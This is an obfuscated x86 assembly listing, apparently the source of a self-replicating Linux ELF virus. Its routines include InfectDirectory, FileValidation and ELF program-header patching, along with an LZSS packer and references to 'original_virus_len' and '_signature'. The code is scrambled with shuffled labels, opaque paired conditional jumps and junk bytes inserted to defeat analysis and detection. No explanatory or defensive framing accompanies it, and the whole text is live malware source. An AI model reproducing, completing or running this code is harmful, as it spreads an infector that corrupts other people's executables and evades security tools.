..@fUAbL65MRSwj:
    je          ..@7ONu0sgfMoHg
    jmp         $+4
db 0x7d, 0x74
    jmp         $+4
db 0x8b, 0x4b
    jmp         ..@HRNEgAiKRjuo
..@KDPI86zipRCy:
    xchg        rcx, rcx
    jb          ..@vTeka7a5mi11
    jae         ..@vTeka7a5mi11
..@5K1Qu253NnQI:
    xchg        rdi, rdi
    jmp         $+4
db 0xe3, 0x14
    jmp         $+4
db 0x76, 0x62
    jl          ..@sm75lir6gCKJ
    jge         ..@sm75lir6gCKJ
..@oG93GGafDohW:
%ifdef X86_32
    push        ebp
%endif
    jmp         $+5
db 0x39, 0x5b, 0x46
    jmp         $+3
db 0x4c
    jl          ..@RDxa26yN9PbW
    jge         ..@RDxa26yN9PbW
..@LKeDIddv3ns2:
    xchg        rbx, rbx
    jmp         $+5
db 0x48, 0x62, 0x1d
    jmp         $+4
db 0x87, 0x2c
    jb          ..@apYwbSh5BeZI
    jae         ..@apYwbSh5BeZI
..@FBnPjCkxByVw:
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+5
db 0xa8, 0x4e, 0x81
    js          ..@U4MuvADUcMuJ
    jns         ..@U4MuvADUcMuJ
..@yZpnPmYGHPog:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    jmp         $+3
db 0xee
    jb          ..@RY7T57tobuDo
    jae         ..@RY7T57tobuDo
..@eHrMCDVPobXy:
    ret
    jb          WORDToDWORDASCII
    jae         WORDToDWORDASCII
..@r2UmSb8nTjhn:
    push        rax
    jmp         $+5
db 0x90, 0x6c, 0xc9
    jmp         ..@sek7mlPbnsOD
..@l7Wbxvdd45qM:
    xchg        rsp, rsp
    js          ..@49CBUcSv2x6r
    jns         ..@49CBUcSv2x6r
..@CLfJ42TqS9nV:
    xchg        rsp, rsp
    jmp         ..@inWJtTLEpekE
..@apYwbSh5BeZI:
    mov         rbp, rbp
    jmp         ..@BRxOSWnnqRz6
..@wAfuV5pgsS2i:
    mov         rdi, rdi
    jb          ..@sISuwrG8VwrM
    jae         ..@sISuwrG8VwrM
..@sNVtVrEGhXDf:
    push        rax
    jmp         $+4
db 0x2e, 0x0f
    jb          ..@fTtYqwbhH6am
    jae         ..@fTtYqwbhH6am
..@1qyRLZy3828U:
    mov         r3, r4
    jmp         $+3
db 0x8f
    jl          ..@iCJT9WcLb1Df
    jge         ..@iCJT9WcLb1Df
..@2BaCK5e02TN6:
    push        rdi
    jmp         $+3
db 0x90
    jmp         $+4
db 0x0a, 0x25
    jb          ..@GXwU1IoehSRU
    jae         ..@GXwU1IoehSRU
..@NtHGGRSp8mB7:
    push        rbx
    jb          ..@5KrnkKp8hr6s
    jae         ..@5KrnkKp8hr6s
..@uQ0edOR9tgXY:
    pop         rdx
    jmp         $+5
db 0x8d, 0x0e, 0x69
    jmp         ..@B5hYJQIm3POr
..@iBAvQRypQjsl:
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         ..@aCnwoDXLmS7t
..@P7l8ZQUXu9Py:
    je          ..@EpYR12khU4By
    jmp         $+3
db 0x4f
    jmp         ..@DOAv021NwryU
..@2PskbiImP3i8:
    call        Strcpy
    jmp         $+5
db 0x8b, 0xd8, 0xe8
    je          ..@nOk5RrqMvado
    jne         ..@nOk5RrqMvado
..@rUIe8Arzm2J0:
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    jmp         $+3
db 0x4e
    jmp         $+5
db 0x89, 0xe4, 0x00
    jmp         ..@O2ugmylaCPav
..@VnjymbvmsxVS:
    mov         BYTE [r1], '/'
    jmp         ..@w2oGJvThpheh
..@WTLJaZoU3AyN:
    push        rdi
    js          ..@5yA3rtnMg0xP
    jns         ..@5yA3rtnMg0xP
..@Hm7GfzvJivx4:
    push        rax
    jmp         $+3
db 0x65
    jmp         ..@bnKQBDzehNiH
..@q12ZGTH8qzxr:
    mov         rsi, m7
    jmp         $+3
db 0x23
    jb          ..@jlfu6lU4h06o
    jae         ..@jlfu6lU4h06o
..@OiNPoEE6rYMP:
    push        rbx
    js          ..@HysgYWNPdnCF
    jns         ..@HysgYWNPdnCF
..@HzKVx752Rc0D:
    jmp         ..@HcbwzB052Gw1
    jmp         $+3
db 0x2d
    jmp         $+3
db 0x2f
    jmp         ..@F86lFXTQj7ym
..@7qV2Q4glsN0Y:
    jl          ..@KcMIalbTPaej
    jmp         $+5
db 0x84, 0xab, 0xee
    jmp         $+4
db 0xf0, 0x9c
    jmp         $+3
db 0x5d
    jl          ..@AGwknoPRff4d
    jge         ..@AGwknoPRff4d
..@rFZsUYmkFWYg:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         ..@mWdJyl2o1ZgV
..@RN00HzaZSIrX:
    mov         rbp, rbp
    js          ..@H6CRGFfvzZKm
    jns         ..@H6CRGFfvzZKm
..@Sb6UQsj8U1G3:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         $+5
db 0x97, 0xa7, 0x92
    jb          ..@Bz40hiFJRpwP
    jae         ..@Bz40hiFJRpwP
..@qxXlWQTDwRj0:
    mov         rsp, rsp
    jmp         ..@RV1rrvKS3PxF
..@yUKy6FD3sMo0:
    pop         rsi
    jmp         $+3
db 0xa7
    jmp         ..@MFEe2gXNI9uo
..@ibox1VPTvxjF:
    pop         rdx
    je          ..@hcrxeQu7QKbF
    jne         ..@hcrxeQu7QKbF
..@HuWmjb6uzHy4:
    call        InfectDirectory
    js          ..@Dsc9LVstYRyt
    jns         ..@Dsc9LVstYRyt
..@jCDFSoILCURA:
    mov         r4, m7
    jb          ..@pF0TvrBupU4P
    jae         ..@pF0TvrBupU4P
..@bAQO9xhQiQ9O:
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    jmp         $+5
db 0xfe, 0x1b, 0xb7
    jl          ..@JwQr24BT8R0I
    jge         ..@JwQr24BT8R0I
..@gCMgAywP0qhx:
    jz          ..@mpbcXXsteA1L
    jb          ..@Owlt5q4Yo6yq
    jae         ..@Owlt5q4Yo6yq
..@TIEfrZtgXmBP:
    add         r1, r4
    jmp         ..@1FBpREFioTzW
..@BcTCqPBtEex6:
    mov         rax, r2
    js          ..@3ag1JUeF7uaZ
    jns         ..@3ag1JUeF7uaZ
..@fAtT47ay3QOX:
    pop         rcx
    jb          ..@OHKnkwWm2Cct
    jae         ..@OHKnkwWm2Cct
..@rndxgiPOunok:
    mov         rdi, rdi
    jl          ..@5ScuQlyFROMZ
    jge         ..@5ScuQlyFROMZ
..@A2jSteDEdNUy:
    push        rsi
    js          ..@rjys5UlGRtX4
    jns         ..@rjys5UlGRtX4
..@cNEGoHsHb5f8:
    test        r2, r2
    jmp         $+3
db 0x96
    jl          ..@He9XZsAIiMZA
    jge         ..@He9XZsAIiMZA
..@0Y2YDPHcYSxr:
    push        rsi
    jb          ..@by2gHxpIEM6i
    jae         ..@by2gHxpIEM6i
..@bdJPyGVbmwmJ:
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    je          ..@H3Umd2qe8HCn
    jne         ..@H3Umd2qe8HCn
..@vdPrPQYJnypt:
    mov         rsi, rdi
    jmp         ..@T1hu9ISrw1wD
..@V73ut60foRNf:
    jg          ..@TxZjXiXyzd4c
    jmp         ..@xo2MTa8Lz1kt
..@rjys5UlGRtX4:
    pop         rsi
    jmp         $+5
db 0x38, 0xd3, 0x4a
    jmp         $+3
db 0x96
    jmp         $+3
db 0x5a
    js          ..@ns36hepphYHa
    jns         ..@ns36hepphYHa
..@aB5cB7zClO7o:
    xchg        rbx, rbx
    jb          ..@MOGOkWZpsqR4
    jae         ..@MOGOkWZpsqR4
MemMove:
    jmp         ..@jFMWxWg2JKwR
..@ZPowBvikLXOr:
    xor         r1, r1
    jmp         ..@0FTPbRCP6RNv
..@s6fmdXWIB61s:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         ..@CjfhVbOPgpfg
..@09Te6NqEn7ul:
    mov         rbx, rbx
    jl          ..@nO9CJuJEuukq
    jge         ..@nO9CJuJEuukq
..@TZw4ZsttqhaZ:
    mov         rax, rax
    jmp         ..@bFJLnPKEjdc0
..@T5UXP4nhrV8P:
    jmp         ..@4aKGEtYNITlk
    jmp         ..@oxGXG78794JD
..@eb56cnEFad9c:
%ifdef X86_32
    xchg        rsp, rsp
%endif
    jmp         $+5
db 0x8f, 0xc2, 0x83
    jb          ..@nJccP6h4Koa3
    jae         ..@nJccP6h4Koa3
..@TTD35L2fEvfk:
    push        rcx
    jmp         $+3
db 0xef
    je          ..@uFjo5x2wsPPc
    jne         ..@uFjo5x2wsPPc
..@NyRp8eMYmSO7:
    mov         ecx, WINDOW_LENGTH*2
    jmp         $+3
db 0xfd
    jmp         ..@XhgEz5yKm1g4
..@zUtRydTX2Zss:
    mov         rsp, rsp
    jmp         $+3
db 0x0b
    jl          ..@UkvRSWUCeCVs
    jge         ..@UkvRSWUCeCVs
..@Z1B7Ze6ypEq2:
    je          ..@2x7Hm7KP2xl4
    jmp         ..@biPwdmwFMFIk
..@KhF0aNr5yePF:
    push        rsi
    jl          ..@V8bLoJC9yR7X
    jge         ..@V8bLoJC9yR7X
..@0V72s3HcSKov:
    mov         rax, rax
    jl          ..@L6BHuCi8gJEa
    jge         ..@L6BHuCi8gJEa
..@F86lFXTQj7ym:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         $+3
db 0xd3
    jmp         ..@Tu5tW64kCAVS
..@ja6CgCqfUpb3:
    sub         r2, 1
    jmp         ..@HcbwzB052Gw1
..@8vDFdElTfpad:
    rep         stosb
    js          ..@iGRM67sKCXrw
    jns         ..@iGRM67sKCXrw
..@8R69D88mMxcJ:
    mov         rbx, rbx
    jmp         $+3
db 0x4f
    jb          ..@Lxo0TYmFuZum
    jae         ..@Lxo0TYmFuZum
..@NzOUzt1mYOCE:
    je          ..@Xcsq7B63ZiSR
    jmp         $+5
db 0x74, 0x1b, 0xa0
    jmp         ..@4bWUDyoVVSl0
..@ozVpxELDkzia:
    xchg        rbx, rbx
    jb          ..@I19MqXjcWFPR
    jae         ..@I19MqXjcWFPR
..@3yDlLbEfVSyZ:
    mov         rbx, rbx
    jl          ..@HBnYWYzmtF7f
    jge         ..@HBnYWYzmtF7f
..@RY7T57tobuDo:
    xor         rax, rax
    jmp         $+5
db 0x30, 0x9d, 0xb5
    jmp         $+4
db 0x13, 0x28
    jmp         $+4
db 0x78, 0xeb
    js          ..@11FQdbsb8fOY
    jns         ..@11FQdbsb8fOY
..@krYlbOuUGuD4:
    pop         rcx
    js          ..@SgD2bnzaizZk
    jns         ..@SgD2bnzaizZk
..@em0ye9VXltO8:
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@HwR4sGyMGdEN
..@EBq6a6ZTYgmW:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+3
db 0xd7
    jmp         $+3
db 0xe7
    jb          ..@CF88S0DvdHvV
    jae         ..@CF88S0DvdHvV
..@txPSja3WRcZF:
    mov         rbx, rbx
    jmp         ..@TTD35L2fEvfk
..@3OCxNwwOUrXD:
    push        rdi
    jb          ..@S8rsoa59pQAy
    jae         ..@S8rsoa59pQAy
..@JuFL6rDDHKnT:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+5
db 0xb4, 0xaf, 0x29
    jmp         ..@ILILnYVJMaub
..@uQQN8vtE9CgJ:
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    jmp         ..@ukW3TxgDoW4C
..@51Gxi6ZEqzuH:
    xchg        rbx, rbx
    jl          ..@2iHpGX34ZcCU
    jge         ..@2iHpGX34ZcCU
..@NX82FzKiLMuA:
    push        rax
    jmp         $+3
db 0x62
    jb          ..@maMpf10BwJrf
    jae         ..@maMpf10BwJrf
..@bOnZaDguVlzm:
    jmp         ..@rFZsUYmkFWYg
    jb          ..@84SW3nfxsO3K
    jae         ..@84SW3nfxsO3K
..@hPcZPZjeoaRV:
    mov         rbx, rbx
    jmp         $+3
db 0x99
    jmp         ..@nbGIlZo7pKuA
..@8KsvdorhYO52:
    pop         rax
    jmp         ..@Zvn2E93LOpnH
..@45irtxpGSkq1:
    push        rcx
    jmp         $+4
db 0x9b, 0x76
    jmp         ..@fAtT47ay3QOX
..@X3EEFF3BuQdq:
    call        Strcpy
    jb          ..@baSTBrVIEt7l
    jae         ..@baSTBrVIEt7l
..@8ZPzrEbYa0RG:
    mov         r2, r1
    jl          ..@A74KLNxYz5Lb
    jge         ..@A74KLNxYz5Lb
..@yPcPuOpGBzAK:
    mov         rbp, rbp
    js          ..@MJUJu7VVZ8aR
    jns         ..@MJUJu7VVZ8aR
..@q4wE4gsxTfzo:
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jl          ..@T5UXP4nhrV8P
    jge         ..@T5UXP4nhrV8P
..@L9k3h5eZzOwQ:
    pop         r4
    jmp         $+4
db 0x25, 0x49
    jmp         $+5
db 0x48, 0xef, 0x06
    jl          ..@rX3tNEmeS2k0
    jge         ..@rX3tNEmeS2k0
..@tguo28WC9vPV:
    jz          ..@0qpXyCftRIbn
    jmp         ..@ZRJks6IMjCoo
FileValidation:
    jmp         ..@c0l5yBnsjMWw
..@EJVdWqtpKfhB:
    add         ecx, 1
    jmp         ..@ome9ltVtpIyy
..@nkXIfRplG29Z:
%ifdef X86_32
    rep         nop
%endif
    je          ..@RxE1LfYQ9oBO
    jne         ..@RxE1LfYQ9oBO
..@MHDASIj8pdCt:
%ifdef X86_32
    pop         rsi
%endif
    jb          ..@ZZCW5mweWZeE
    jae         ..@ZZCW5mweWZeE
..@cZdHMCEqgJBw:
    je          ..@KhF0aNr5yePF
    jmp         ..@0wk3nXLwnxmY
..@AohgAjZuJoK1:
    xor         rdi, rdi
    jmp         $+4
db 0x42, 0x90
    jmp         ..@fuMNughrqGmR
..@SP8RHqHgy1Zt:
    jmp         ..@f8BoGsrEvq8o
    jmp         $+3
db 0x21
    js          ..@oalzYxYtFFPv
    jns         ..@oalzYxYtFFPv
..@wzLybGCQ7LIU:
    add         r2, rax
    jmp         $+4
db 0x01, 0x1a
    jmp         ..@i4kbtldYjh9G
..@8MpCqIxbutEi:
    mov         rdx, rdx
    jb          ..@6IFg2XmEFELc
    jae         ..@6IFg2XmEFELc
..@LnLZs0fLP5BI:
    push        rsi
    je          ..@tUo7fJYT6TC7
    jne         ..@tUo7fJYT6TC7
..@N2REP3sAlNTQ:
%ifdef X86_32
    mov         edi, DWORD [edi+file.filefd]
%endif
    js          ..@oG93GGafDohW
    jns         ..@oG93GGafDohW
..@NmZDT9l3M2OA:
    test        rax, rax
    je          ..@SgM9Jw9PAtSY
    jne         ..@SgM9Jw9PAtSY
..@RBIWJ0kUqGur:
    mov         r5, r3
    jb          ..@nfS6vT2E0O32
    jae         ..@nfS6vT2E0O32
..@OtL0OTHhYREi:
    jmp         ..@kvxyBBVN23xy
    jmp         $+3
db 0xe3
    jb          ..@1PriOCwVSsob
    jae         ..@1PriOCwVSsob
..@G619hewyxCaL:
    xchg        rdi, rdi
    je          ..@eEjUirwuD7Td
    jne         ..@eEjUirwuD7Td
..@ZSIlP9lw2uJK:
    push        rdx
    jmp         $+4
db 0xb9, 0xec
    jmp         ..@Cc4ytxahCxM2
..@Y07v1dpbYJgA:
    mov         rbp, rbp
    jl          ..@9I0n4UlCkpaC
    jge         ..@9I0n4UlCkpaC
..@5I5l0W1w9EvX:
    xchg        rbx, rbx
    jl          ..@YMmmJFx84RWZ
    jge         ..@YMmmJFx84RWZ
..@uyrSU0tnRTei:
    pop         rax
    js          ..@45irtxpGSkq1
    jns         ..@45irtxpGSkq1
..@BRxOSWnnqRz6:
    push        rdi
    jmp         $+4
db 0xa1, 0x2d
    jl          ..@3cz6Nr8xhetG
    jge         ..@3cz6Nr8xhetG
..@7QsF7FFXoJUc:
    add         r5, rax
    jmp         ..@X68YMJCxgcYg
..@5yA3rtnMg0xP:
    pop         rdi
    je          ..@ep9AMyiqR28z
    jne         ..@ep9AMyiqR28z
..@X5OlYqEgQaYv:
    mov         r3, [r1+e_h.e_phoff]
    jmp         ..@3OADlnbex6Wf
..@iid7sJQoTDkt:
    jle         ..@tXq6O6XxwT69
    jb          ..@VyrcE1uvFrIT
    jae         ..@VyrcE1uvFrIT
..@Uhrg98Dx8A4n:
    GGLOBAL     _signature
    jmp         ..@8GidhIqJbYXW
..@dFt3IEIlhPRp:
    pop         rbx
    jmp         ..@TC27eD5Y2DZj
..@CtBCFDEbAYLG:
    add         r3, r5
    jmp         ..@Dhl1Jk6wUfMT
..@9QggRpRYFsNM:
    mov         rsp, rsp
    jb          ..@Aq8zPSMiHkTu
    jae         ..@Aq8zPSMiHkTu
..@Dz8HfwN1Jodl:
    pop         r2
    jmp         $+5
db 0xff, 0xaf, 0xa9
    jmp         $+5
db 0xfa, 0x8e, 0x98
    je          ..@A2jSteDEdNUy
    jne         ..@A2jSteDEdNUy
..@k6sWs4Dn9pqI:
    xor         rdx, rdx
    jmp         $+4
db 0x97, 0xd8
    jmp         ..@kf6rrillcsIZ
..@EESyHOhtEEbH:
%ifdef X86_64
    push        rcx
%endif
    jmp         $+5
db 0xcc, 0x98, 0x29
    jmp         ..@uYOfcSaErOhB
..@9JOFcY9jBxnc:
    jmp         ..@fX4VttTD6iq6
    jmp         ..@54MQlWU9zcxF
..@p1yWmLLBwLYl:
    VAR         packed, dirs_tmp
    jmp         $+5
db 0xae, 0xa0, 0x67
    jl          ..@Z8aOxb2mc0GM
    jge         ..@Z8aOxb2mc0GM
..@g1jdaTjlgqpW:
    mov         eax, SYS_MUNMAP
    jb          ..@gZkX4BKqwQnr
    jae         ..@gZkX4BKqwQnr
..@nJ3mqeB2sdzA:
%ifdef X86_64
    mov         r8d, DWORD [r8+file.filefd]
%endif
    jmp         $+4
db 0x2b, 0x02
    jmp         $+4
db 0x12, 0x6f
    jmp         $+4
db 0x35, 0x77
    jmp         $+3
db 0xda
    jmp         ..@1g3DudVmBrQm
..@GoPNYFh2ZI3a:
    pop         rcx
    jmp         $+5
db 0x9b, 0xb4, 0xcf
    je          ..@lbr4whD6IuaF
    jne         ..@lbr4whD6IuaF
..@6kWPWDqlUJO1:
    cmp         cl, 0x4
    jmp         $+5
db 0x1d, 0x1a, 0xfc
    jmp         ..@9FoRuTciFEp1
..@BoefwdXMUhmB:
    mov         rbx, rbx
    jb          ..@lWsxB6VM47Oc
    jae         ..@lWsxB6VM47Oc
..@8DLUAi4FAlRf:
    xor         rax, rax
    jb          ..@jqqtOCo4UyyE
    jae         ..@jqqtOCo4UyyE
..@bhkakU2ZVnYx:
    mov         QWORD [r2+p_h.p_vaddr], r3
    js          ..@xiFNswhrowgA
    jns         ..@xiFNswhrowgA
..@MoiHgnGQZYrh:
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jmp         $+3
db 0x03
    jb          ..@etGfzOchGiyS
    jae         ..@etGfzOchGiyS
..@cp135qaMwlmB:
    xor         rax, rax
    jmp         ..@65nGg0gHpfKv
..@nby8BqjEmuz8:
    push        rsi
    jb          ..@UCnzclZtvKQR
    jae         ..@UCnzclZtvKQR
..@ew8Vr4uRlDIn:
    rep         movsb
    jmp         $+5
db 0x5f, 0x27, 0x71
    jmp         ..@XqhCB4UIfeFc
..@ds9ictoXmZ5u:
%ifdef X86_64
    pop         rsi
%endif
    jmp         $+4
db 0x7e, 0xf5
    jb          ..@lSmxAodmoz9j
    jae         ..@lSmxAodmoz9j
..@CaFaqR3PpJ7s:
    push        rdx
    jmp         $+3
db 0xce
    jmp         $+4
db 0x12, 0x99
    jb          ..@im8YXGP5kXMb
    jae         ..@im8YXGP5kXMb
..@IsoYpmnaNMBj:
    pop         r3
    jmp         $+5
db 0x97, 0x4a, 0x50
    jmp         $+5
db 0x19, 0x5a, 0xf6
    js          ..@Ra2mp0g89mqK
    jns         ..@Ra2mp0g89mqK
..@fQennTsGMy7s:
    xchg        rdx, rdx
    jl          ..@2BaCK5e02TN6
    jge         ..@2BaCK5e02TN6
..@S417i2MsAQSo:
    push        rdi
    jmp         $+4
db 0xaa, 0x74
    jmp         $+5
db 0x79, 0x16, 0xe3
    jmp         ..@22GMKvmDgahJ
..@F4uKyYGqX95D:
    mov         rdx, rdx
    jmp         $+3
db 0x4c
    jmp         ..@Ux4Q4kOFU5Zv
..@DTF3SAuBwX42:
    mov         DWORD [rdi], esi
    jmp         $+4
db 0xf2, 0x67
    jb          ..@JY50Y9mKh4TV
    jae         ..@JY50Y9mKh4TV
..@oQiz5Yz1b8w4:
    mov         rax, r4
    jmp         ..@CLfJ42TqS9nV
..@e0YnnJoYkTvd:
    mov         rcx, rcx
    jmp         $+4
db 0x5c, 0xcc
    jb          ..@oLgRoggII5g9
    jae         ..@oLgRoggII5g9
..@QgLZmNRw46eZ:
    rep         nop
    jmp         ..@i0yMqb0hozXL
..@OiKcFrmybQOE:
    mov         rsp, rsp
    jmp         $+3
db 0x81
    jb          ..@YG29MfGbkwMB
    jae         ..@YG29MfGbkwMB
..@VmfCyRzE5QqC:
    mov         rdx, rdx
    jmp         ..@DGDfa093JnfW
..@5hKuZITBCp83:
    sub         rdi, 1
    jmp         ..@UbDjBIzo5qQc
..@eqwyrsUb5FCR:
    mov         rdi, rdi
    jmp         ..@Bl7MWm2FCKoT
..@lqJw0pCLeHas:
    push        rcx
    js          ..@6gJ7yYflvN33
    jns         ..@6gJ7yYflvN33
..@8NCjFeuoEttB:
    mov         rdi, rdi
    jb          ..@QMzzMV9TqKA5
    jae         ..@QMzzMV9TqKA5
..@ns36hepphYHa:
    pop         r3
    jmp         ..@CSmonEmfyjV1
..@kb8eQfaKDWFX:
    mov         rsi, rsi
    jb          ..@VyAtPoZI4Xr6
    jae         ..@VyAtPoZI4Xr6
..@0RMDGGQe5wgw:
    mov         rbx, rbx
    jmp         ..@uzvGiLsrx8hy
..@hs6HCQt2vabg:
    add         r4, rax
    jmp         $+5
db 0x3a, 0x44, 0x11
    jmp         $+4
db 0xc7, 0x19
    jb          ..@MoiHgnGQZYrh
    jae         ..@MoiHgnGQZYrh
..@9ilBRxmwUc6Z:
    sub         rsp, _PROC_OFF_size
    jmp         ..@UuGEL3jBboBb
..@xf43K4Hx5WKc:
    cmp         rax, 0
    jl          ..@SMbAKbOgrEgC
    jge         ..@SMbAKbOgrEgC
..@ecn5eX34EGb0:
    rep         nop
    jmp         ..@Em6LgF5e0QaA
..@iqCJUDuAz9Im:
    and         r2, 1b
    js          ..@cNEGoHsHb5f8
    jns         ..@cNEGoHsHb5f8
..@xgsMEQHHnPUY:
    mov         rcx, rcx
    jmp         $+5
db 0xf7, 0x7b, 0x11
    jmp         ..@C3A88enJ6CMF
..@RxP2S6kerB9i:
    push        rax
    jmp         ..@xuFQbdPDFcJj
..@EyxGAQrOMs5D:
    ret
    jmp         $+3
db 0xd6
    je          _eof
    jne         _eof
..@dtQ1bzqJzQvr:
    xchg        rdi, rdi
    jmp         $+4
db 0x22, 0x51
    jmp         $+4
db 0x74, 0xc6
    jl          ..@1fKnr6QgYO2t
    jge         ..@1fKnr6QgYO2t
..@osfhFLrSrEbD:
    lea         r1, [rsp+_INFFILE_OFF.file]
    js          ..@kYuIHxArnhs7
    jns         ..@kYuIHxArnhs7
..@n06iEakdcy2O:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    jmp         $+3
db 0x7c
    jmp         ..@3ElBOGPS6mHB
..@3OADlnbex6Wf:
    lea         r4, [r1]
    jl          ..@BRR5Balhd9SC
    jge         ..@BRR5Balhd9SC
..@LRarJbTznoH0:
    mov         rbx, rbx
    jmp         ..@OUvabuKsowG9
..@maMpf10BwJrf:
    pop         rax
    jmp         $+3
db 0x4d
    jb          ..@fEgJxtNIQTLd
    jae         ..@fEgJxtNIQTLd
..@8GidhIqJbYXW:
    push        rbx
    jmp         $+3
db 0x79
    jmp         ..@XR2CHXemCWQJ
..@wvkYACNsCi2h:
%ifdef X86_64
    pop         rbx
%endif
    jmp         $+3
db 0xd8
    jmp         $+4
db 0xbf, 0xc7
    jmp         ..@d1OPxBPltVVK
..@S2NYZGDw3kAU:
    pop         rbx
    jmp         $+5
db 0xa0, 0x0e, 0x78
    js          ..@rvXExtONXiVr
    jns         ..@rvXExtONXiVr
..@8QCAaefpntvL:
    xchg        rsp, rsp
    jmp         ..@7Y2a5QrQEWMe
..@CF88S0DvdHvV:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+4
db 0xfc, 0xfd
    jmp         ..@DtTjZGEkTMst
..@pxgo9Jdq4frw:
    pop         rbx
    jmp         $+4
db 0x31, 0x2e
    jmp         $+5
db 0xa2, 0x8f, 0x3d
    jl          ..@ghCp5rceoo5R
    jge         ..@ghCp5rceoo5R
..@MedpIo9TrEVK:
    pop         r1
    je          ..@MI0aoIe4C52V
    jne         ..@MI0aoIe4C52V
..@QrASg3mjEhGY:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jl          ..@Aye4afQskxLl
    jge         ..@Aye4afQskxLl
..@VuDu2SbspgxV:
    cmp         al, 0xa
    jmp         $+5
db 0x59, 0x04, 0x24
    jmp         $+4
db 0xa9, 0x17
    jmp         $+4
db 0x8d, 0xaa
    jl          ..@miGGnLrcqPng
    jge         ..@miGGnLrcqPng
..@tDzqZLGPStC3:
    add         rsi, WINDOW_LENGTH
    js          ..@QgLZmNRw46eZ
    jns         ..@QgLZmNRw46eZ
..@1eIHNGhU4CUV:
    jmp         ..@JISh5mJkrJz1
    jl          ..@EBG6YGeiUZQH
    jge         ..@EBG6YGeiUZQH
..@4Nnq0s9cjfWW:
    xchg        rcx, rcx
    jmp         ..@w6BwIdpt4ZOO
..@jInbB1HIHWyJ:
    mov         r2, QWORD [r5+file.filesize]
    jmp         ..@2iVHwqr1BhME
..@WAhlmBMC0ftp:
    and         eax, edx
    jmp         ..@r6uXVPEYGchB
..@Qc3Hv2Hi6FiF:
    jle         ..@EBG6YGeiUZQH
    jmp         $+3
db 0x9b
    jb          ..@hoEhlElYyyQL
    jae         ..@hoEhlElYyyQL
..@X68YMJCxgcYg:
    add         r5, 1
    jb          ..@E9ExgWVnwN02
    jae         ..@E9ExgWVnwN02
..@iu7mHzD5tDeK:
    mov         r2, original_virus_len-non_packed_len
    jb          ..@4WnrQA17zavb
    jae         ..@4WnrQA17zavb
UnmapFile:
    jmp         ..@qTC8zGvv4kZE
..@yxX37oUWPFZa:
    xchg        rdi, rdi
    js          ..@q12ZGTH8qzxr
    jns         ..@q12ZGTH8qzxr
..@cIiEvzuYgsVU:
    mov         r2, QWORD [r5+file.fileptr]
    js          ..@Uhrg98Dx8A4n
    jns         ..@Uhrg98Dx8A4n
..@K6o0hD2GoJdl:
    add         rdi, rax
    jmp         $+4
db 0xfa, 0x3c
    js          ..@Z8MM26fI784i
    jns         ..@Z8MM26fI784i
..@V51PmIuDHShR:
    push        rdi
    jmp         ..@SSYGMmteH3Zx
..@b4GB4zIWLWqZ:
    push        rdi
    jmp         $+5
db 0xff, 0xa1, 0x8d
    jb          ..@KrFpXvlzyGOS
    jae         ..@KrFpXvlzyGOS
..@4u68uGeA4KX6:
    jnz         ..@aBwQ5Wjgk3Kh
    js          ..@uceHq2KNGVxY
    jns         ..@uceHq2KNGVxY
..@grbqeN6tNrpf:
    sub         r3, PADDING
    jmp         $+3
db 0xbf
    jmp         $+3
db 0x71
    js          ..@iu7mHzD5tDeK
    jns         ..@iu7mHzD5tDeK
..@WeMU3pJOEWYA:
    mov         rcx, rcx
    jb          ..@lkfQdAtpd6f6
    jae         ..@lkfQdAtpd6f6
..@q30TZQpLcIre:
    mov         rdx, rdx
    jmp         $+5
db 0x80, 0xbb, 0xce
    js          ..@pCYfo9DeVuds
    jns         ..@pCYfo9DeVuds
..@V3Z7TFJ9uDW2:
    mov         rcx, rcx
    jb          ..@P2GRm5EPAAWG
    jae         ..@P2GRm5EPAAWG
..@YN7dazU0aYUz:
%ifdef X86_64
    pop         rsi
%endif
    jmp         $+4
db 0x99, 0x4c
    jb          ..@QB7sDNtOMvN2
    jae         ..@QB7sDNtOMvN2
..@pSwo40OKMAdF:
    jne         ..@b57s9zdrznFN
    jmp         $+3
db 0xc9
    jl          ..@ZaIvNOjQKj35
    jge         ..@ZaIvNOjQKj35
..@LhV8XrKyJJqV:
    add         rbx, 1
    jmp         ..@zTuOqoSuuqLE
..@aBwQ5Wjgk3Kh:
    shr         edx, 1
    js          ..@KTjI7zGfAA5G
    jns         ..@KTjI7zGfAA5G
..@B5hYJQIm3POr:
    rep         stosb
    jmp         ..@MHXeF6UAWUm7
..@onJB9s7WCkp0:
    xchg        rax, rax
    jmp         $+4
db 0x5d, 0xa7
    js          ..@9Rm7pqmbc5kl
    jns         ..@9Rm7pqmbc5kl
..@z8rDV7vmEutt:
    push        rax
    js          ..@XppS2PngbU8H
    jns         ..@XppS2PngbU8H
..@jVxY62m0SNwT:
    push        rdx
    jmp         $+5
db 0xe2, 0x10, 0x34
    jl          ..@b87XEMVrR2w7
    jge         ..@b87XEMVrR2w7
..@AGwknoPRff4d:
    xchg        rdi, rdi
    jmp         ..@1eIHNGhU4CUV
..@drVwpHaf2BUt:
    pop         rdi
    jmp         $+4
db 0x22, 0x61
    jmp         $+5
db 0x83, 0xfe, 0xb9
    jmp         $+5
db 0x0d, 0x54, 0x83
    jmp         $+5
db 0x2a, 0x83, 0x6e
    jmp         NonBinaryFile
..@f62FCV7zF4T6:
    xchg        rdi, rdi
    jmp         $+3
db 0xf5
    je          ..@qcs33qkB5clN
    jne         ..@qcs33qkB5clN
